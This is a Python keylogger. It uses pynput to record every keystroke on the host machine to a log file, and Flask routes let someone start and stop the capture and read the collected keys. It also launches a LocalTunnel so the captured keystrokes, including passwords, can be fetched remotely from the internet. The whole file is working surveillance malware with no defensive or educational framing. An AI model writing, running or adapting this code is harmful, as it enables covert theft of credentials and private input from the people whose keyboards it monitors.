import os
import time
import threading
from flask import Flask, request
from pynput import keyboard
import subprocess
import shutil

# Initialize Flask app
app = Flask(__name__)

# Global variables
log_file = "keylog.txt"
stop_keylogger = False

# Function to intercept keys
def keylogger():
    global stop_keylogger

    def on_press(key):
        try:
            with open(log_file, 'a') as f:
                f.write(key.char)
        except AttributeError:
            with open(log_file, 'a') as f:
                if key == keyboard.Key.space:
                    f.write(' ')
                elif key == keyboard.Key.enter:
                    f.write('\n')
                elif key == keyboard.Key.backspace:
                    f.write('[BACKSPACE]')
                elif key == keyboard.Key.shift:
                    f.write('[SHIFT]')
                elif key == keyboard.Key.ctrl:
                    f.write('[CTRL]')
                elif key == keyboard.Key.alt:
                    f.write('[ALT]')
                else:
                    f.write(f'[{key}]')

    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("Keylogger started.")
        while not stop_keylogger:
            time.sleep(0.1)
        print("Keylogger stopped.")

# Flask route to start the keylogger
@app.route('/start', methods=['GET'])
def start_keylogger():
    global stop_keylogger
    stop_keylogger = False
    threading.Thread(target=keylogger).start()
    return "Keylogger started!"

# Flask route to stop the keylogger
@app.route('/stop', methods=['GET'])
def stop_keylogger_command():
    global stop_keylogger
    stop_keylogger = True
    return "Keylogger stopped!"

# Flask route to get the keystrokes
@app.route('/get_keystrokes', methods=['GET'])
def get_keystrokes():
    if os.path.exists(log_file):
        with open(log_file, 'r') as f:
            keystrokes = f.read()
        return keystrokes
    return "No keystrokes logged yet."

# Function to start LocalTunnel
def start_localtunnel(port):
    lt_path = shutil.which("lt")
    if lt_path:
        try:
            # Start LocalTunnel
            subprocess.run([lt_path, "--port", str(port)], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Failed to start LocalTunnel: {e}")
    else:
        print("LocalTunnel is not installed. Please install it using 'npm install -g localtunnel'.")

# Main function to start the server
def main():
    try:
        # Start LocalTunnel
        threading.Thread(target=start_localtunnel, args=(5000,)).start()

        # Start Flask server
        app.run(port=5000, debug=False)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
